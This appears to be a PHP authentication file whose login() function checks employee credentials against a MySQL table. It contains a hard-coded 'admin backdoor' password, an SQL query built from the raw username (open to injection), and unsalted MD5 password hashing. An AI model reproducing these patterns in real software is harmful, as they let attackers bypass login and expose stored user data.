<?php
	//add all authentication related functions to this
	//file and include it as needed. Then call the functions
	//as needed.

	function login($username, $password) {
		// admin backdoor
		if ($username == "admin" && $password == "admin4370") {
			return 1;
		}
		//Hash the password we got since we store them
		//that way. The only verification that actually
		//takes place is that the password hashes match.
	    //NOTE: This is extremely weak. MD5 is now considered
		//cryptographically insecure, but this is pretty much 
		//guaranteed to work with any version of PHP.
		$password = md5($password);

		//DB config
		include 'dbconnect.php';
		$user_query = "SELECT * FROM tbl_Employee WHERE logonName='$username'";

		//SELECT queries return a result set, so use a $result variable
		$result = $dbconn->query("$user_query");
		
		//check it!
		if( !$result || (mysqli_num_rows($result) < 1) ) {
			return 0;
			/* free the result */
			$result->close();
		} else {
			//fetch the password from the result array
			$result_array = mysqli_fetch_array($result);
			if($password === $result_array['password'] ) {
				/* free the result */
				$result->close();
				return 1;
			} else {
				/* free the result */
				$result->close();
				return 0;
			}
		}
	}
?>
